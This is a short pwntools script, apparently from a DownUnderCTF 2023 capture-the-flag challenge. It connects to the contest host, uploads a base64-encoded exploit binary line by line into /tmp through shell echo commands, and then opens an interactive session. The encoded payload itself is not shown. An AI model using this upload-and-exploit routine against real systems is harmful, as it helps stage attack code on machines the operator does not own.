from pwn import *

context.log_level = 'debug'
io = remote('pwn-shifty-mem-997358e069975515.2023.ductf.dev', 443, ssl=True)
exe_b64 = (open("racy_encode","rb").readlines())
for l in exe_b64:
    io.sendlineafter(b'$ ',b'echo -n "' + l[:-1]+b'" >> /tmp/ratio_exploit2.txt')
io.interactive()
